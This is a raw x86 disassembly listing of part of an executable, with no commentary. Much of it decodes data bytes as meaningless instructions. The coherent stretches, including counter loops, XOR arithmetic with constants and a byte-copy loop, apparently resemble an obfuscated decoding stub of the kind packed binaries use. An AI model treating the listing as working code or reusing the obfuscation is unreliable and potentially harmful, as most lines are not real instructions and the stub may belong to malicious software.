  40f333:	or     ecx,DWORD PTR [esi-0x1f]
  40f336:	sbb    DWORD PTR [eax+0x7b7ac71],edx
  40f33c:	or     al,BYTE PTR gs:[ebx]
  40f33f:	rol    DWORD PTR [eax+0xdef9a9d],0x3b
  40f346:	jg     0x40f2ca
  40f348:	mov    dh,0x19
  40f34a:	mov    ah,0xc4
  40f34c:	(bad)  
  40f34d:	mov    ds:0x18094152,eax
  40f352:	jns    0x40f3c3
  40f354:	jp     0x40f36c
  40f356:	push   esi
  40f357:	sub    bh,BYTE PTR [ebx]
  40f359:	(bad)  
  40f35a:	fisttp QWORD PTR [edi]
  40f35c:	arpl   WORD PTR [ecx-0x24],dx
  40f35f:	push   cs
  40f360:	push   es
  40f361:	push   ecx
  40f362:	jns    0x40f370
  40f364:	aaa    
  40f365:	mov    cl,0xe9
  40f367:	mov    BYTE PTR [esi-0x33],dh
  40f36a:	rcr    DWORD PTR [ecx+0x2447e385],cl
  40f370:	out    dx,eax
  40f371:	xchg   edi,eax
  40f372:	shl    ebp,cl
  40f374:	push   ds
  40f375:	push   edi
  40f376:	outs   dx,BYTE PTR ds:[esi]
  40f377:	nop
  40f378:	cmp    cl,BYTE PTR [ebp-0x6ffa0702]
  40f37e:	pop    esi
  40f37f:	out    0x83,al
  40f381:	xor    al,0xb8
  40f383:	xor    DWORD PTR [ebp+0x2581f89c],eax
  40f389:	daa    
  40f38a:	cmp    BYTE PTR [ebx+0x0],al
  40f38d:	add    BYTE PTR [eax],al
  40f38f:	add    BYTE PTR [eax],al
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x433827
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x433827,ecx
  40f3a0:	cmp    DWORD PTR ds:0x433827,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x433827,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x433827
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x433827,ecx
  40f3d0:	cmp    DWORD PTR ds:0x433827,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x43372b
  40f3e3:	mov    ecx,DWORD PTR ds:0x433803
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x433757,0x13
  40f3fb:	cmp    DWORD PTR ds:0x433757,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x433757,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x433757
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x433757,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x4337ef,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x4337ef
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x4337ef,ecx
  40f444:	cmp    DWORD PTR ds:0x4337ef,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x4337ef,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x4337ef
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x4337ef,ecx
  40f474:	cmp    DWORD PTR ds:0x4337ef,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x4337db,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x4337db
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x4337db,edx
  40f498:	cmp    DWORD PTR ds:0x4337db,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433991
  40f4af:	push   0x4339e7
  40f4b4:	push   0x4339cb
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x4337db,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433817
  40f4d2:	adc    DWORD PTR ds:0x433827,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax-0x4e7d64c7]
  40f540:	fcmovnbe st,st(4)
  40f542:	lods   al,BYTE PTR ds:[esi]
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	xor    BYTE PTR [eax+edx*4+0x70bae61c],ah
  40f550:	scas   al,BYTE PTR es:[edi]
  40f551:	mov    WORD PTR [ebp-0x36b84491],gs
  40f557:	(bad)  [ebp-0x41cf802a]
  40f55d:	xchg   edx,eax
  40f55e:	push   ebx
  40f55f:	pop    ds
  40f560:	push   edi
  40f561:	xchg   BYTE PTR [edi+0x5c],dl
  40f564:	or     DWORD PTR [esi+0x76e7e538],0x15c29cb8
  40f56e:	fxch   st(6)
  40f570:	dec    esi
  40f571:	sub    eax,DWORD PTR [ecx+0x38]
  40f574:	cmp    al,0x28
  40f576:	dec    ecx
  40f577:	sbb    dl,BYTE PTR [ebx+eiz*8+0x7e]
  40f57b:	dec    eax
  40f57c:	test   eax,0x374d3834
  40f581:	inc    esp
  40f582:	int3   
  40f583:	out    dx,al
  40f584:	jb     0x40f531
  40f586:	adc    esi,DWORD PTR [edx-0x4c50bdf0]
  40f58c:	stc    
  40f58d:	ins    BYTE PTR es:[edi],dx
  40f58e:	(bad)  
  40f58f:	loopne 0x40f538
  40f591:	sub    al,0x87
  40f593:	iret   
  40f594:	add    eax,0xac72b751
  40f599:	test   eax,0xc0b03294
  40f59e:	dec    eax
  40f59f:	loope  0x40f529
  40f5a1:	adc    al,0xeb
  40f5a3:	mov    bh,0x79
  40f5a5:	ins    BYTE PTR es:[edi],dx
  40f5a6:	into   
  40f5a7:	push   ecx
  40f5a8:	les    ebx,FWORD PTR [esi-0x50]
  40f5ab:	jp     0x40f552
  40f5ad:	xor    al,0x78
  40f5af:	mov    eax,ds:0x522dce00
  40f5b4:	cmp    DWORD PTR [esi+0x70],edx
  40f5b7:	mov    bh,0x41
  40f5b9:	push   0x9c7dcd67
  40f5be:	(bad)  
  40f5bf:	push   ds
  40f5c0:	test   al,0x55
  40f5c2:	ficom  DWORD PTR [esi]
  40f5c4:	pusha  
  40f5c5:	dec    edx
  40f5c6:	aas    
  40f5c7:	in     al,0xbe
  40f5c9:	out    dx,al
  40f5ca:	sbb    eax,0xe7dc94aa
  40f5cf:	dec    esp
  40f5d0:	pop    edx
  40f5d1:	test   DWORD PTR [esi+0xe3839e2],ebx
  40f5d7:	dec    eax
  40f5d8:	call   0x56a02e07
  40f5dd:	sahf   
  40f5de:	jmp    0xd04d:0x9042835d
  40f5e5:	fdivr  QWORD PTR [ecx+ebx*4]
  40f5e8:	sti    
  40f5e9:	call   0x82fdd12c
  40f5ee:	push   eax
  40f5ef:	sub    DWORD PTR [ecx-0x144caf04],ebp
  40f5f5:	lds    esi,FWORD PTR [ebp*1+0x75a5870f]
  40f5fc:	out    0xf6,al
  40f5fe:	or     al,0xfb
  40f600:	outs   dx,DWORD PTR ds:[esi]
  40f601:	cmp    al,0x6e
  40f603:	out    dx,eax
  40f604:	mov    DWORD PTR [ecx],esp
  40f606:	test   BYTE PTR [ebp+edi*4+0x46f4f0a7],ah
  40f60d:	fisttp WORD PTR [ecx+0x63]
  40f610:	enter  0x384b,0x2f
  40f614:	push   cs
  40f615:	sbb    esi,esi
  40f617:	xchg   esi,eax
  40f618:	or     BYTE PTR [eax-0x5b],dh
  40f61b:	or     BYTE PTR [ebp+0x1c53d681],0x24
  40f622:	je     0x40f68e
  40f624:	inc    esp
  40f625:	cli    
  40f626:	fisttp WORD PTR [edx]
  40f628:	into   
  40f629:	int3   
  40f62a:	mov    bh,0x25
  40f62c:	mov    eax,ds:0x8a67841a
  40f631:	cwde   
  40f632:	out    dx,al
  40f633:	add    bl,BYTE PTR [ecx]
  40f635:	inc    esi
  40f636:	inc    edx
  40f637:	xchg   esi,eax
  40f638:	das    
  40f639:	push   0xe075d8a8
  40f63e:	xchg   ebp,eax
  40f63f:	and    ah,BYTE PTR [ebx-0x1df2ac87]
  40f645:	push   ss
  40f646:	dec    ebx
  40f647:	jmp    0x40f632
  40f649:	dec    esi
  40f64a:	gs (bad) 
  40f64c:	mov    al,0x93
  40f64e:	les    esp,FWORD PTR [ecx-0x41]
  40f651:	mov    esp,0x3bdf2e01
  40f656:	push   eax
  40f657:	sub    eax,0xe2c0ea7a
  40f65c:	shr    BYTE PTR [edx+0x5b2c0755],cl
  40f662:	or     BYTE PTR [edi-0x32],cl
  40f665:	dec    ebx
  40f666:	ret    
  40f667:	out    dx,al
  40f668:	addr16 sti 
  40f66a:	shl    ah,cl
  40f66c:	mov    ebp,esi
  40f66e:	sbb    esp,DWORD PTR ds:0x4f6fadf7
  40f674:	les    ecx,FWORD PTR ds:0x849507d9
  40f67a:	push   ds
  40f67b:	lahf   
  40f67c:	fild   QWORD PTR [esi]
  40f67e:	bound  eax,QWORD PTR [ebx+0x1c6434ba]
  40f684:	pcmpgtw mm0,mm6
  40f687:	xchg   esi,eax
  40f688:	add    BYTE PTR [ecx+ebp*1],ch
  40f68b:	rcr    DWORD PTR [esi+0x266c6ba3],1
  40f691:	or     edi,edx
  40f693:	dec    ebx
  40f694:	adc    eax,0x1514cdb1
  40f699:	fnstcw WORD PTR [ebp-0x6410d726]
  40f69f:	sbb    BYTE PTR [esi-0x6a],dl
  40f6a2:	clc    
  40f6a3:	popf   
  40f6a4:	pop    ss
  40f6a5:	dec    esp
  40f6a6:	and    BYTE PTR [edi+0xc],0x53
  40f6aa:	(bad)  
  40f6ab:	jbe    0x40f6ea
  40f6ad:	cmp    DWORD PTR [edi],ebp
  40f6af:	pop    esi
  40f6b0:	sar    DWORD PTR [ebx+0x6e],0x3f
  40f6b4:	(bad)  
  40f6b5:	mov    ah,0xd2
  40f6b7:	fdivr  st(0),st
  40f6b9:	(bad)  
  40f6ba:	mov    ebp,0x7096bcf
  40f6bf:	rol    BYTE PTR [edx],1
  40f6c1:	shl    bh,cl
  40f6c3:	sub    ah,ah
  40f6c5:	jae    0x40f6fa
  40f6c7:	mov    edx,0xcf515799
  40f6cc:	shl    DWORD PTR [eax-0x24e7c974],0x57
  40f6d3:	in     al,0xdb
  40f6d5:	outs   dx,BYTE PTR ds:[esi]
  40f6d6:	xchg   esi,eax
  40f6d7:	jb     0x40f72b
  40f6d9:	sbb    cl,dl
  40f6db:	or     eax,0xffffffd1
  40f6de:	ret    
  40f6df:	clc    
  40f6e0:	mov    ?,edx
  40f6e2:	or     bl,BYTE PTR [ebp-0x6bcee954]
  40f6e8:	shl    BYTE PTR [edx+0x596809ca],1
  40f6ee:	rol    DWORD PTR [ebp-0x20],1
  40f6f1:	int    0x6a
  40f6f3:	push   ss
  40f6f4:	lods   al,BYTE PTR ds:[esi]
  40f6f5:	jns    0x40f756
  40f6f7:	xor    DWORD PTR [ebx+0x41d5030],esi
  40f6fd:	ss push ds
  40f6ff:	push   ss
  40f700:	popf   
  40f701:	pop    eax
  40f702:	dec    edi
  40f703:	push   ebp
  40f704:	popf   
  40f705:	cld    
  40f706:	outs   dx,BYTE PTR ds:[esi]
  40f707:	repz xchg ebx,eax
  40f709:	(bad)
  40f70c:	outs   dx,BYTE PTR ds:[esi]
  40f70d:	add    bl,BYTE PTR [ecx-0x1ff62f9f]
  40f713:	mov    al,0x10
  40f715:	xlat   BYTE PTR ds:[ebx]
  40f716:	sbb    edi,DWORD PTR [ecx-0x2c]
  40f719:	adc    BYTE PTR [esp+eax*8],bh
  40f71c:	add    bh,BYTE PTR [ebx]
  40f71e:	into   
  40f71f:	imul   bx,WORD PTR [esi],0xffad
  40f723:	imul   esp,eax,0x7c
  40f726:	rcr    DWORD PTR [edx+0x1a42a613],1
  40f72c:	imul   ecx,eax,0xffffff86
  40f72f:	pop    esi
  40f730:	addr16 jp 0x40f772
  40f733:	inc    eax
  40f734:	and    eax,0x4bcc0ee6
  40f739:	aas    
  40f73a:	ins    DWORD PTR es:[edi],dx
  40f73b:	in     eax,dx
  40f73c:	in     al,dx
  40f73d:	retf   
  40f73e:	inc    ebx
  40f73f:	mov    dh,0x41
  40f741:	mov    ds,WORD PTR [edi-0x64e03d7b]
  40f747:	or     al,0x97
  40f749:	jmp    0xfdc2:0x2928ba9a
  40f750:	dec    ebx
  40f751:	fs popw es
  40f754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f755:	add    eax,0x5bc11078
  40f75a:	adc    al,0x91
  40f75c:	pop    esi
  40f75d:	loope  0x40f7b6
  40f75f:	sbb    BYTE PTR [ebx+0x54],bl
  40f762:	out    dx,eax
  40f763:	add    DWORD PTR [ebp+0xc],esi
  40f766:	dec    edi
  40f767:	mov    bl,0xb5
  40f769:	into   
  40f76a:	lds    eax,FWORD PTR [ebx+0x6d]
  40f76d:	scas   eax,DWORD PTR es:[edi]
  40f76e:	cmp    esi,DWORD PTR [ebx+0x36cd90c6]
  40f774:	imul   esp,DWORD PTR [ebp-0x62],0x847a77e5
  40f77b:	pop    es
  40f77c:	or     ecx,DWORD PTR [esi]
  40f77e:	mov    ds:0x87896ebe,al
  40f783:	mov    edx,0x472a058f
  40f788:	mov    DWORD PTR [ebp-0x7dbeb6ea],ebp
  40f78e:	test   DWORD PTR [eax],0x2d77395e
  40f794:	mov    eax,0xcf6803f2
  40f799:	fisub  WORD PTR [edx-0x5c]
  40f79c:	pop    ss
  40f79d:	xchg   edx,eax
  40f79e:	push   ecx
  40f79f:	sub    eax,0x1d69475e
  40f7a4:	fild   WORD PTR [edx+esi*4]
  40f7a7:	add    al,0x67
  40f7a9:	push   esi
  40f7aa:	imul   edx,DWORD PTR fs:[esi-0x477daec4],0x7a
  40f7b2:	xor    dh,BYTE PTR [ecx+0x4345e311]
  40f7b8:	push   es
  40f7b9:	in     eax,0x13
  40f7bb:	xchg   ebp,eax
  40f7bc:	xor    BYTE PTR [ebx-0x7c704d4d],0xb3
  40f7c3:	arpl   WORD PTR [eax+0x50fe44c5],dx
  40f7c9:	mov    ebx,DWORD PTR ds:0x1ea488b9
  40f7cf:	dec    eax
  40f7d0:	sbb    BYTE PTR [edx-0x59],bh
  40f7d3:	mov    ecx,0x8ba30a48
  40f7d8:	fsubr  DWORD PTR [ebx]
  40f7da:	adc    BYTE PTR [eax+0x7c],dl
  40f7dd:	mov    ebp,0x3e0c56fa
  40f7e2:	xlat   BYTE PTR ds:[ebx]
  40f7e3:	pop    ss
  40f7e4:	dec    esp
  40f7e5:	xchg   ecx,eax
  40f7e6:	scas   al,BYTE PTR es:[edi]
  40f7e7:	add    esp,DWORD PTR [edi-0x1]
  40f7ea:	ret    0x5044
  40f7ed:	dec    edi
  40f7ee:	out    dx,al
  40f7ef:	mov    edx,0x483a7b4
  40f7f4:	xchg   edx,eax
  40f7f5:	arpl   WORD PTR [esi],di
  40f7f7:	jg     0x40f7f1
  40f7f9:	and    edi,DWORD PTR ds:0x71502f2b
  40f7ff:	in     al,dx
  40f800:	push   esp
  40f801:	int3   
  40f802:	sbb    eax,0xa1f3aa3d
  40f807:	imul   esp,DWORD PTR [edi+0x13],0xffbf881f
  40f80e:	sbb    ah,BYTE PTR ds:0x4462455b
  40f814:	or     DWORD PTR [esi],ecx
  40f816:	pop    edx
  40f817:	aam    0xba
  40f819:	pusha  
  40f81a:	mov    al,ds:0xfeaf8745
  40f81f:	mov    ds:0xa9bf29c4,eax
  40f824:	dec    ebx
  40f825:	mov    cl,0xab
  40f827:	aaa    
  40f828:	aas    
  40f829:	out    dx,eax
  40f82a:	out    dx,eax
  40f82b:	push   0x6f
  40f82d:	ret    
  40f82e:	adc    DWORD PTR ds:0x8cc5cdd0,edi
  40f834:	or     dl,BYTE PTR ds:0x9e7a6efb
  40f83a:	fwait
  40f83b:	sahf   
  40f83c:	inc    eax
  40f83d:	mov    bh,0xcd
  40f83f:	mov    bh,bl
  40f841:	jo     0x40f843
  40f843:	mov    edx,0x4501d8cc
  40f848:	and    eax,0xf933c073
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0x8651113f
  40f897:	jl     0x40f86b
  40f899:	stos   DWORD PTR es:[edi],eax
  40f89a:	jle    0x40f91a
  40f89c:	jl     0x40f91b
  40f89e:	jle    0x40f91e
  40f8a0:	jns    0x40f825
  40f8a2:	inc    ebx
  40f8a3:	sbb    bl,BYTE PTR [eax]
  40f8a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8a6:	inc    edi
  40f8a7:	xchg   ebx,eax
  40f8a8:	xchg   DWORD PTR [edi+0x23441c62],eax
  40f8ae:	inc    ecx
  40f8af:	dec    ebx
  40f8b0:	call   0xbebf:0xbcda5493
  40f8b7:	inc    eax
  40f8b8:	dec    esp
  40f8b9:	enter  0x8c15,0x2a
  40f8bd:	sub    eax,0x6fabe64
  40f8c2:	add    bh,BYTE PTR [ebp+0x40073199]
  40f8c8:	test   BYTE PTR [ebp-0xd26e42c],0xa
  40f8cf:	adc    ecx,esi
  40f8d1:	les    ebx,FWORD PTR [ecx]
  40f8d3:	rcl    BYTE PTR [eax-0x7a288bbf],cl
  40f8d9:	mov    bl,0x66
  40f8db:	add    ebp,DWORD PTR [esi+0x3ab74222]
  40f8e1:	repnz or DWORD PTR [ebx],edx
  40f8e4:	es int3 
  40f8e6:	ja     0x40f8a4
  40f8e8:	loope  0x40f902
  40f8ea:	xlat   BYTE PTR ds:[ebx]
  40f8eb:	or     bh,BYTE PTR ss:[edx+0x15]
  40f8ef:	neg    BYTE PTR [ebx-0x54b6b40a]
  40f8f5:	sbb    BYTE PTR [edi-0x3b],0xb4
  40f8f9:	loopne 0x40f8e4
  40f8fb:	sub    eax,edi
  40f8fd:	dec    esi
  40f8fe:	pop    eax
  40f8ff:	or     dl,BYTE PTR [edx+0x2a]
  40f902:	pop    esp
  40f903:	lea    ebx,[edi+0x5e]
  40f906:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f907:	test   ch,cl
  40f909:	pop    ebx
  40f90a:	icebp  
  40f90b:	jbe    0x40f8e7
  40f90d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f90e:	test   DWORD PTR [edx-0x2874b6b1],ecx
  40f914:	xor    DWORD PTR [eax+0x4e351045],0xae87f7d2
  40f91e:	cmp    BYTE PTR ds:0xb86e7c93,cl
  40f924:	ret    0xea9
  40f927:	or     BYTE PTR [eax-0x5fa15f0a],ch
  40f92d:	push   esp
  40f92e:	rcl    DWORD PTR [eax+edi*1],0x26
  40f932:	xchg   ebx,eax
  40f933:	push   ebx
  40f934:	mov    edi,0xcb5cfafb
  40f939:	cmp    edx,eax
  40f93b:	inc    edi
  40f93c:	sbb    DWORD PTR [edi+ebp*8+0x5bb3af1f],ecx
  40f943:	mov    ?,WORD PTR [eax+0x194b7ba8]
  40f949:	fcomi  st,st(5)
  40f94b:	call   0x19eb5a14
  40f950:	adc    DWORD PTR [ecx],esi
  40f952:	cmp    al,0xb
  40f954:	dec    edx
  40f955:	xchg   edx,eax
  40f956:	adc    bl,BYTE PTR [ecx+0x7962edcf]
  40f95c:	mov    al,ds:0x3d73bf7e
  40f961:	out    0x8f,eax
  40f963:	shl    BYTE PTR [esi],1
  40f965:	mov    esp,0xc91a1e67
  40f96a:	mov    ebp,0x2bfbc679
  40f96f:	mov    ds:0x53f3b825,al
  40f974:	xchg   esi,eax
  40f975:	cmp    DWORD PTR ds:0x63a4871,edx
  40f97b:	pop    esi
  40f97c:	sbb    DWORD PTR [eax],ebp
  40f97e:	or     DWORD PTR [eax+0x2972f197],ebx
  40f984:	pop    esi
  40f985:	outs   dx,DWORD PTR ds:[esi]
  40f986:	pop    ecx
  40f987:	test   DWORD PTR [eax-0x17],0x37e478ed
  40f98e:	xor    eax,0x924963a8
  40f993:	pop    es
  40f994:	aas    
  40f995:	shl    DWORD PTR [edx+0x2fb689f9],0xf4
  40f99c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f99d:	mov    ch,0x8b
  40f99f:	pop    ebx
  40f9a0:	cmp    ecx,DWORD PTR [esi+0x52]
  40f9a3:	adc    eax,0x9b9f49c8
  40f9a8:	mov    al,0x21
  40f9aa:	pop    esi
  40f9ab:	mov    ebx,0x4424e1c7
  40f9b0:	mov    ?,ebp
  40f9b2:	mov    ds:0xbf414539,al
  40f9b7:	push   0x22955501
  40f9bc:	push   ecx
  40f9bd:	push   ecx
  40f9be:	and    ebx,DWORD PTR [ecx+0x68ffa21d]
  40f9c4:	jp     0x40f999
  40f9c6:	das    
  40f9c7:	mov    ah,0xc4
  40f9c9:	mov    ebp,0x5daa2322
  40f9ce:	bound  ebx,QWORD PTR [esi]
  40f9d0:	cdq    
  40f9d1:	jne    0x40f95b
  40f9d3:	ror    BYTE PTR [edi+edx*8-0x44],0xba
  40f9d8:	sar    DWORD PTR [eax-0x31024d99],cl
  40f9de:	rol    DWORD PTR [ebp+0x2d5c013b],cl
  40f9e4:	in     eax,dx
  40f9e5:	push   edx
  40f9e6:	dec    ebp
  40f9e7:	(bad)  
  40f9e9:	jp     0x40fa57
  40f9eb:	out    0x22,eax
  40f9ed:	outs   dx,DWORD PTR gs:[esi]
  40f9ef:	mov    ds:0x44981760,al
  40f9f4:	jne    0x40f9f5
  40f9f6:	pop    ebp
  40f9f7:	lea    ebx,[ebx]
  40f9f9:	add    ecx,esi
  40f9fb:	add    BYTE PTR [esi-0x3c7ef9f5],ah
  40fa01:	inc    ecx
  40fa02:	add    DWORD PTR [esi+ebp*4],edi
  40fa05:	into   
  40fa06:	sahf   
  40fa07:	enter  0x19d9,0x60
  40fa0b:	mov    BYTE PTR [eax+0x35],al
  40fa0e:	cmp    ch,BYTE PTR [edx+0x28]
  40fa11:	pushw  cs
  40fa13:	aam    0x88
  40fa15:	popa   
  40fa16:	ss popf 
  40fa18:	mov    eax,ds:0x62beaa27
  40fa1d:	or     eax,0x4ff2b73d
  40fa22:	sub    ch,ah
  40fa24:	push   ds
  40fa25:	ficom  WORD PTR [ebx]
  40fa27:	mov    cl,ah
  40fa29:	test   dh,ah
  40fa2b:	popf   
  40fa2c:	xchg   edx,eax
  40fa2d:	jmp    0x48b8:0x6b984854
  40fa34:	test   al,0xe3
  40fa36:	jg     0x40f9c8
  40fa38:	adc    ecx,DWORD PTR [eax+0x4c]
  40fa3b:	popa   
  40fa3c:	ins    DWORD PTR es:[edi],dx
  40fa3d:	mov    ebp,0xd050b9ed
  40fa42:	mov    ch,BYTE PTR [eax-0x88ba261]
  40fa48:	sbb    al,0x48
  40fa4a:	pop    edi
  40fa4b:	ss jno 0x40fa49
  40fa4e:	in     eax,dx
  40fa4f:	aas    
  40fa50:	dec    ebp
  40fa51:	test   al,ch
  40fa53:	and    edi,DWORD PTR [edx+ebp*2-0x7e]
  40fa57:	or     eax,0xfc388eee
  40fa5c:	rcl    DWORD PTR [ebx-0x61],cl
  40fa5f:	xor    BYTE PTR [esi+eax*4-0x25],cl
  40fa63:	stos   BYTE PTR es:[edi],al
  40fa64:	sbb    BYTE PTR es:[ecx],ah
  40fa67:	ins    BYTE PTR es:[edi],dx
  40fa68:	iret   
  40fa69:	sub    ah,bl
  40fa6b:	adc    DWORD PTR [esp+eiz*4-0x35],edx
  40fa6f:	mov    bh,0x44
  40fa71:	test   eax,0x7876620
  40fa76:	add    BYTE PTR [esi+0x6],dh
  40fa79:	jae    0x40fad6
  40fa7b:	mov    edi,edx
  40fa7d:	daa    
  40fa7e:	jge    0x40fa97
  40fa80:	jb     0x40fad3
  40fa82:	push   esp
  40fa83:	add    al,0x5d
  40fa85:	add    al,0x4c
  40fa87:	stos   DWORD PTR es:[edi],eax
  40fa88:	pop    ebx
  40fa89:	sub    eax,0xf4243882
  40fa8e:	dec    esi
  40fa8f:	lods   al,BYTE PTR ds:[esi]
  40fa90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa91:	inc    edx
  40fa92:	fs push ebx
  40fa94:	push   ebp
  40fa95:	repz js 0x40fa2d
  40fa98:	or     BYTE PTR [esi+0x4bc6686a],bl
  40fa9e:	and    al,0xdc
  40faa0:	xlat   BYTE PTR ds:[ebx]
  40faa1:	mov    eax,ds:0xae6b7b00
  40faa6:	pop    ds
  40faa7:	dec    eax
  40faa8:	test   ecx,edi
  40faaa:	inc    esp
  40faab:	pop    esp
  40faac:	or     BYTE PTR [ecx],dh
  40faae:	cmp    edx,DWORD PTR [edi+0x2d]
  40fab1:	stc    
  40fab2:	xchg   ecx,eax
  40fab3:	test   eax,0x298985b2
  40fab8:	cmp    ebx,DWORD PTR [ebx]
  40faba:	test   al,0x12
  40fabc:	jmp    0x40fb25
  40fabe:	stos   BYTE PTR es:[edi],al
  40fabf:	test   eax,0xec1bcf86
  40fac4:	mov    cs:0x5e9d236c,al
  40faca:	ja     0x40faa3
  40facc:	xor    al,0x7
  40face:	cld    
  40facf:	push   esp
  40fad0:	mov    esp,DWORD PTR [edi-0x2d]
  40fad3:	neg    bl
  40fad5:	fwait
  40fad6:	cli    
  40fad7:	jo     0x40fa94
  40fad9:	(bad)  
  40fadb:	inc    esi
  40fadc:	dec    eax
  40fadd:	(bad)  
  40fade:	loop   0x40fb50
  40fae0:	push   es
  40fae1:	adc    al,0xad
  40fae3:	fdivr  st,st(6)
  40fae5:	fnstsw WORD PTR [ebx]
  40fae7:	shl    DWORD PTR [ebx+0x4],1
  40faea:	mov    edi,0x4d2ae7b3
  40faef:	jnp    0x40fb3a
  40faf1:	retf   
  40faf2:	mov    ebp,eax
  40faf4:	leave  
  40faf5:	cwde   
  40faf6:	add    eax,0xc816dd30
  40fafb:	cmp    edx,DWORD PTR [ebx]
  40fafd:	cmp    al,BYTE PTR [eax+0x4b]
  40fb00:	outs   dx,BYTE PTR ds:[esi]
  40fb01:	test   al,0x2b
  40fb03:	shl    edi,1
  40fb05:	popa   
  40fb06:	imul   edi,DWORD PTR [ebx],0xffffffd5
  40fb09:	push   eax
  40fb0a:	cdq    
  40fb0b:	fsub   DWORD PTR [eax+0x59dc1d2f]
  40fb11:	mov    esp,0xdc68055
  40fb16:	or     eax,0x3e4d8ffc
  40fb1b:	and    BYTE PTR [eax+0x3],dl
  40fb1e:	fimul  DWORD PTR [esi+0x6a832343]
  40fb24:	adc    edi,esp
  40fb26:	jecxz  0x40faee
  40fb28:	and    dh,ch
  40fb2a:	fsub   QWORD PTR [eax+0x58]
  40fb2d:	(bad)  
  40fb2e:	sahf   
  40fb2f:	jno    0x40fae5
  40fb31:	pop    ss
  40fb32:	jae    0x40fafc
  40fb34:	leave  
  40fb35:	adc    al,0xbc
  40fb37:	jne    0x40fb39
  40fb39:	jp     0x40fb88
  40fb3b:	sahf   
  40fb3c:	ins    BYTE PTR es:[edi],dx
  40fb3d:	icebp  
  40fb3e:	xlat   BYTE PTR ds:[ebx]
  40fb3f:	pop    es
  40fb40:	dec    ecx
  40fb41:	stos   DWORD PTR es:[edi],eax
  40fb42:	sub    DWORD PTR [ebp*4+0x58959c4e],eax
  40fb49:	xor    ah,BYTE PTR [eax+edx*2]
  40fb4c:	xor    dh,BYTE PTR [eax+0x4bb88d64]
